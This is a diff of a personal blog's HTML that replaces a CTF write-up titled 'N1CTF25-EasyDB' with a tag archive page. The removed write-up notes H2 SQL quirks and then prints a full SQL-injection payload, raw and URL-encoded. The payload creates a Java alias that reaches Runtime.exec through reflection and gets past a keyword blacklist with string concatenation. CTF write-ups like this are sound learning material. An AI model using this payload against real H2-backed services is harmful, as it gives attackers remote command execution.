@@ -9,7 +9,7 @@
     
     <title>
         
-            N1CTF25-EasyDB |
+            标签: 其他知识 Java Python |
         
         1diot9&#39;s Blog
     </title>
@@ -104,7 +104,7 @@
                         </li>
                     
                         
-                        <li class="menu-item flex-start border-box">
+                        <li class="menu-item flex-start border-box active">
                             <a class="menu-text-color border-box" href="/tags">
                                 
                                 标签
@@ -179,7 +179,7 @@
                 </li>
             
                 
-                <li class="drawer-menu-item border-box not-sub-menu">
+                <li class="drawer-menu-item border-box not-sub-menu active">
                     <label class="drawer-menu-label border-box">
                         <a class="drawer-menu-text-color left-side flex-start border-box" href="/tags">
                             
@@ -229,266 +229,39 @@
             <div class="main-content border-box">
                 
 
-                    
-<div class="fade-in-down-animation">
-    <div class="post-page-container border-box">
-        <div class="post-content-container border-box">
+                    <div class="fade-in-down-animation">
+    <div class="tag-archive-container border-box">
+        <div class="tag-name"><i class="fas fa-hashtag"></i>&nbsp;其他知识 Java Python
+        </div>
+        <div class="tag-post-list">
             
-
-            <div class="post-content-bottom border-box">
+<div class="archive-list-container border-box">
+    
+        <section class="archive-item border-box">
+            <div class="archive-item-header border-box">
+                <span class="archive-year">2025</span>
+            </div>
+            <ul class="archive-item-body border-box">
                 
-                    <div class="post-title">
-                        N1CTF25-EasyDB
-                    </div>
+                    <li class="post-item border-box">
+                        <span class="starting-point border-box flex-center"></span>
+                        <span class="post-date border-box">06-03</span>
+                        <a class="post-title border-box text-ellipsis"
+                           href="/2025/06/03/%E7%BC%96%E7%A0%81%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/"
+                        >编码方式学习</a>
+                    </li>
                 
-
-                
-                    <div class="post-header border-box">
-                        
-                            <div class="avatar-box border-box">
-                                <img src="/images/baka.png">
-                            </div>
-                        
-                        <div class="info-box">
-                            <div class="author border-box">
-                                <span class="name">1diot9</span>
-                                
-                                    <span class="author-badge">Lv3</span>
-                                
-                            </div>
-                            <div class="meta-info border-box">
-                                
-
-<div class="post-meta-info-container border-box post">
-    <div class="post-meta-info border-box">
-        
-
-        
-            <span class="meta-info-item post-create-date">
-                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
-                <span class="datetime">2025-05-09 19:13:17</span>
-            </span>
-
-            
-                <span class="meta-info-item post-update-date">
-                    <i class="icon fa-solid fa-file-pen"></i>&nbsp;
-                    <span class="datetime" data-updated="Fri May 09 2025 19:14:17 GMT+0800">2025-05-09 19:14:17</span>
-                </span>
-            
-        
-
-        
-            <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
-                <ul class="post-category-ul">
-                    
-                            <li class="category-item"><a href="/categories/CTF-Java/">CTF-Java</a></li>
-                        
-                    
-                </ul>
-            </span>
-        
-
-        
-            <span class="post-tag meta-info-item border-box">
-                <ul class="post-tag-ul">
-                    
-                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/CTF-Java/">CTF-Java</a></li>
-                        
-                    
-                </ul>
-            </span>
-        
-
-        
-        
-            <span class="meta-info-item post-wordcount">
-                <i class="icon fas fa-file-word"></i>&nbsp;<span>527 字</span>
-            </span>
-        
-        
-            <span class="meta-info-item post-min2read">
-                <i class="icon fas fa-clock"></i>&nbsp;<span>2 分钟</span>
-            </span>
-        
-        
-            <span class="meta-info-item post-pv">
-                <i class="icon fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
-            </span>
-        
-    </div>
-
+            </ul>
+        </section>
     
 </div>
 
-                            </div>
-                        </div>
-                    </div>
-                
-
-                <div class="post-content keep-markdown-body ">
-                    
-
-                    
-                         <p>记录一下踩坑</p>
-<p>1、executeQuery 可以执行 create</p>
-<p>一开始以为executeQuery 不能执行create 操作。但是后来发现是可以的，只需要在前面加一个select 语句就行。</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>;<span class="keyword">CREATE</span> ALIAS RT <span class="keyword">AS</span> 。。。。</span><br></pre></td></tr></table></figure>
-
-<p>2、SQL语句中，单引号和双引号的意义不一样</p>
-<p>最后CALL RT(‘calc’);时，一开始用的是双引号，但是双引号会报错：Column “calc” not found; SQL statement:</p>
-<p>CALL RT(“calc”);</p>
-<p>这是因为在 H2 SQL 中，字符串字面量通常使用单引号（’）来包围。双引号（”）在 SQL 中通常用于标识标识符，如表名、列名等。因此，当你在 CALL RT(“calc”) 中使用双引号时，SQL 解释器会将其解释为一个标识符（例如列名），而不是字符串字面量，从而导致错误。</p>
-<p>其他数据库也有这种特性，之后要注意。</p>
-<p>3、h2sql 的注释符只有 – </p>
-<p>一开始用的是#，一直报错。后面查了一下发现没有 #。这点跟mysql 不一样。</p>
-<p>这里主要考察的其实是黑名单绕过，用的是Java的字符串拼接。一开始想到其他编码方式绕过，其实不用这么麻烦。以后应该先考虑这种拼接绕过。</p>
-<p>总结一下，基于字符串的过滤，可以通过：拼接，编码，运算(异或、取反)等方法绕过。</p>
-<p>最终post参数：</p>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aa&#x27;;CREATE ALIAS RT AS $$ void rt(String cmd) throws java.lang.Exception &#123;java.lang.Class&lt;?&gt; run = java.lang.Class.forName(&quot;java.lang.Run&quot; + &quot;time&quot;);java.lang.reflect.Method getr = run.getMethod(&quot;getRun&quot;+&quot;time&quot;);java.lang.reflect.Method ex = run.getMethod(&quot;exe&quot; + &quot;c&quot;, String.class);ex.invoke(getr.invoke(null), &quot;calc&quot;);&#125;$$;CALL RT(&#x27;calc&#x27;);--</span><br></pre></td></tr></table></figure>
-
-
-
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=aa%27%3BCREATE%20ALIAS%20RT%20AS%20%24%24%20void%20rt%28String%20cmd%29%20throws%20java.lang.Exception%20%7Bjava.lang.Class%3C%3F%3E%20run%20%3D%20java.lang.Class.forName%28%22java.lang.Run%22%20%2B%20%22time%22%29%3Bjava.lang.reflect.Method%20getr%20%3D%20run.getMethod%28%22getRun%22%2B%22time%22%29%3Bjava.lang.reflect.Method%20ex%20%3D%20run.getMethod%28%22exe%22%20%2B%20%22c%22%2C%20String.class%29%3Bex.invoke%28getr.invoke%28null%29%2C%20%22calc%22%29%3B%7D%24%24%3BCALL%20RT%28%27calc%27%29%3B--&amp;password=123</span><br></pre></td></tr></table></figure>
-                    
-                </div>
-
-                
-                        
-<div class="post-copyright-info-container border-box">
-    <div class="copyright-info-content border-box">
-        <div class="copyright-info-top border-box">
-            <div class="copyright-post-title border-box text-ellipsis">
-                N1CTF25-EasyDB
-            </div>
-
-            <div class="copyright-post-link border-box text-ellipsis">
-                2025/05/09/N1CTF25-EasyDB/
-            </div>
         </div>
-
-        <div class="copyright-info-bottom border-box">
-            <div class="copyright-post-author bottom-item">
-                <div class="type">
-                    作者
-                </div>
-                <div class="content">1diot9</div>
-            </div>
-
-            <div class="post-time bottom-item">
-                <div class="type">
-                    发布于
-                </div>
-                <div class="content">2025-05-09 19:13</div>
-            </div>
-
-
-            <div class="post-license bottom-item">
-                <div class="type">
-                    许可
-                </div>
-                <div class="content tooltip" data-tooltip-content="CC BY-NC-SA 4.0">
-                    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh-hans" target="_blank">
-                        
-                            <i class="fa-brands fa-creative-commons"></i>
-                            <i class="fa-brands fa-creative-commons-by"></i>
-                            <i class="fa-brands fa-creative-commons-nc"></i>
-                            <i class="fa-brands fa-creative-commons-sa"></i>
-                        
-                    </a>
-                </div>
-            </div>
-        </div>
-
-        <i class="copyright-bg fa-solid fa-copyright"></i>
     </div>
-    <div class="copy-copyright-info flex-center tooltip" data-tooltip-content="复制版权信息" data-tooltip-offset-y="-2px">
-        <i class="fa-solid fa-copy"></i>
-    </div>
-</div>
-
-                
-
-                <div class="post-bottom-tags-and-share border-box">
-                    <div>
-                        
-                            <ul class="post-tags-box border-box">
-                                
-                                    <li class="tag-item border-box">
-                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/CTF-Java/">CTF-Java</a>
-                                    </li>
-                                
-                            </ul>
-                        
-                    </div>
-                    <div>
-                        
-                    </div>
-                </div>
-
-                
-
-                
-                    <div class="post-nav border-box">
-                        
-                            <div class="prev-post">
-                                <a class="prev"
-                                   rel="prev"
-                                   href="/2025/05/09/CISCN24-ezjava/"
-                                   title="CISCN24_ezjava"
-                                >
-                                    <span class="left arrow-icon flex-center">
-                                        <i class="fas fa-chevron-left"></i>
-                                    </span>
-                                    <span class="title flex-center">
-                                        <span class="post-nav-title-item text-ellipsis">CISCN24_ezjava</span>
-                                        <span class="post-nav-item">上一篇</span>
-                                    </span>
-                                </a>
-                            </div>
-                        
-                        
-                            <div class="next-post">
-                                <a class="next"
-                                   rel="next"
-                                   href="/2025/05/09/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E8%B5%9B%E5%88%9D%E8%B5%9B25-JDBCParty/"
-                                   title="软件安全赛初赛25--JDBCParty"
-                                >
-                                    <span class="title flex-center">
-                                        <span class="post-nav-title-item text-ellipsis">软件安全赛初赛25--JDBCParty</span>
-                                        <span class="post-nav-item">下一篇</span>
-                                    </span>
-                                    <span class="right arrow-icon flex-center">
-                                        <i class="fas fa-chevron-right"></i>
-                                    </span>
-                                </a>
-                            </div>
-                        
-                    </div>
-                
-
-                
-                    
+    
 
 
 
-
-
-
-                
-            </div>
-        </div>
-
-        
-            <div class="pc-post-toc right-toc">
-                <div class="post-toc-wrap border-box">
-    <div class="post-toc border-box">
-        
-    </div>
-</div>
-
-            </div>
-        
-    </div>
 </div>
 
 
@@ -552,31 +325,6 @@
 
     <!-- post tools -->
     
-        <div class="post-tools right-toc">
-            <div class="post-tools-container border-box">
-    <ul class="post-tools-list border-box">
-        <!-- PC encrypt again -->
-        
-
-        <!-- PC TOC show toggle -->
-        
-            <li class="tools-item flex-center toggle-show-toc">
-                <i class="fas fa-list"></i>
-            </li>
-        
-
-        <!-- PC go comment -->
-        
-
-        <!-- PC full screen -->
-        <li class="tools-item flex-center full-screen">
-            <i class="fa-solid fa-expand"></i>
-        </li>
-    </ul>
-</div>
-
-        </div>
-    
 
     <!-- side tools -->
     <div class="side-tools">
@@ -607,10 +355,6 @@
     </ul>
 
     <ul class="exposed-tools-list border-box">
-        
-            <li class="tools-item toggle-show-toc-tablet flex-center">
-                <i class="fas fa-list"></i>
-            </li>
         
 
         
@@ -668,18 +412,8 @@
 
     <!-- tablet toc -->
     
-        <div class="tablet-post-toc-mask">
-            <div class="tablet-post-toc">
-                <div class="post-toc-wrap border-box">
-    <div class="post-toc border-box">
-        
-    </div>
-</div>
-
-            </div>
-        </div>
-    
 </main>
+
 
 
 
@@ -717,28 +451,6 @@
     
 
     <!-- post page -->
-    
-        <!-- post-helper -->
-        
-<script src="/js/post/post-helper.js"></script>
-
-
-        <!-- toc -->
-        
-            
-<script src="/js/post/toc.js"></script>
-
-        
-
-        <!-- copyright-info -->
-        
-            
-<script src="/js/post/copyright-info.js"></script>
-
-        
-
-        <!-- share -->
-        
     
 
     <!-- categories page -->
